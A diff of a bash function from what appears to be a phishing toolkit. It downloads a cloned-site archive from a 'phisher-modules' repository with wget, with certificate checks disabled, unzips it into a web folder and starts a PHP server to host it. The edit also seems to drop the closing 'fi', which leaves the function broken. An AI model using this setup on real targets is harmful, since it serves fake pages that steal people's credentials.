@@ -532,31 +532,30 @@ cusport() {
 ##Setup website and start php server
 setup_site() {
 	exit_internet
+	zipfullname="$zipname.zip"
 	rm -rf $zipname
+	rm -rf $zipfullname
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
-	zipfullname=$zipname".zip"
-	zipurl="https://github.com/Alygnt/phisher-modules/raw/main/csites/"$zipfullname
-	wget --no-check-certificate "$zipurl" > /dev/null 2>&1
+	zipurl="https://github.com/Alygnt/phisher-modules/raw/csites/$zipfullname"
+	wget --no-check-certificate $zipurl > /dev/null 2>&1 &
+	sleep 7
 	if [ -e $zipfullname ]; then
-	        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site downloaded sucesssfully..."${WHITE}
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site downloaded sucesssfully..."${WHITE}
 		sleep 0.2
-		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up site..."${WHITE}
-       		mv $zipfullname .server/www
-		unzip .server/www/"$zipfullname"
-		mv $zipname/* .server/www
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up site...${WHITE}"
+		unzip $zipfullname
+		mv $website/* .server/www
 		rm -rf .server/www/"$zipfullname"
 		rm -rf "$zipname"
-##		rm -rf .server/www/"$zipname"
-##		cp -rf .server/www/"$website"/* .server/www/
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Setup complete..."${WHITE}
                 sleep 0.2
 		cusport
 	        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
         	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 	else
-		echo "An error occured!!"
-		msg_exit
-	fi
+		clear
+		banner
+		echo -e "\n${RED}[${WHITE}!${RED}]${BLUE} Not able to download site"${WHITE}
 }
 
 #Check whether link was generated properly
